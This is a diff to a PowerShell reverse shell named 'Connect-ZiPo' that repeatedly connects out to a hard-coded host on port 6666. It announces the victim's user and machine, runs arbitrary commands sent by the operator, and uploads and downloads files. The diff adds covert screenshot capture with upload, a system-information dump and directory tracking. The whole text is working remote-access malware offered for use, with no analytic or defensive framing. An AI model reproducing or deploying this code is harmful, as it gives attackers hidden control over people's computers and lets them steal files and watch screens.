@@ -1,11 +1,12 @@
 function Connect-ZiPo {
     $srv = "192.168.50.228"
     $port = 6666
+    $currentDir = Get-Location
 
     function Upload-File($path) {
         if (Test-Path $path) {
             $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
-            return "[UPLOAD]::$(Split-Path $path -Leaf)::n$b64"
+            return "[UPLOAD]::$(Split-Path $path -Leaf)::`n$b64"
         } else {
             return "[ERROR]::FILE NOT FOUND: $path"
         }
@@ -17,34 +18,46 @@ function Connect-ZiPo {
         return "[DOWNLOADED] $out"
     }
 
+    function Take-Screenshot {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
+                                         [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+        $graphics = [Drawing.Graphics]::FromImage($bmp)
+        $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
+        $path = "$env:TEMP\snap.png"
+        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
+        $graphics.Dispose()
+        $bmp.Dispose()
+        return Upload-File $path
+    }
+
     while ($true) {
         try {
             $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
             $stream = $tcp.GetStream()
             [byte[]]$buffer = 0..65535 | % { 0 }
 
-            # ANSI-цвета и баннер
+            # Banner with color
             $esc = [char]27
             $clear = "$esc[2J$esc[H"
             $banner = @"
 ${esc}[31m
-  __/\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\______/\\\\\\\\\\\\\\\___        
-   _\/\\\///////////____\/\\\///////////_____/\\\///////////__         
-    _\/\\\_______________\/\\\_______________\//\\\______        
-     _\/\\\\\\\\\\\_______\/\\\\\\\\\\\________\////\\\______      
-      _\/\\\///////________\/\\\///////____________\////\\\____       
-       _\/\\\_______________\/\\\_____________________\////\\\__      
-        _\/\\\_______________\/\\\______________/\\\______\//\\\_     
-         _\/\\\_______________\/\\\\\\\\\\\\\\\_\///\\\\\\\\\\\/__    
-          _\///________________\///////////////____\///////////____${esc}[0m
+   ________ _______  ________  ________
+  |\  _____\\  ___ \|\   __  \|\   ____\
+  \ \  \__/ \ \   __<\ \  \|\  \ \  \___|
+   \ \   __\ \ \  \_|\ \ \   __  \ \  \   
+    \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
+     \ \__\    \ \_______\ \__\ \__\ \_______\
+      \|__|     \|_______|\|__|\|__|\|_______|${esc}[0m
 
-${esc}[32m[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
+${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
-Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
+Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 ------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + "`nPS " + (Get-Location) + "> "
+            $intro = $clear + $banner + "`nPS $currentDir> "
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
@@ -65,8 +78,20 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                             $response = "[ERROR] INVALID POST FORMAT"
                         }
                     }
+                    elseif ($cmd -like "cd *") {
+                        $target = $cmd.Substring(3).Trim()
+                        Set-Location -Path $target
+                        $currentDir = Get-Location
+                        $response = ""
+                    }
+                    elseif ($cmd -eq "!sysinfo") {
+                        $response = Get-ComputerInfo | Out-String
+                    }
+                    elseif ($cmd -eq "!screenshot") {
+                        $response = Take-Screenshot
+                    }
                     else {
-                        $sb = [ScriptBlock]::Create($cmd)
+                        $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
                         $output = & $sb 2>&1 | Out-String
                         $response = $output.TrimEnd()
                     }
@@ -75,7 +100,7 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
-                $response += "nPS " + (Get-Location) + "> "
+                $response += "`nPS $currentDir> "
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                 $stream.Write($outBytes, 0, $outBytes.Length)
                 $stream.Flush()
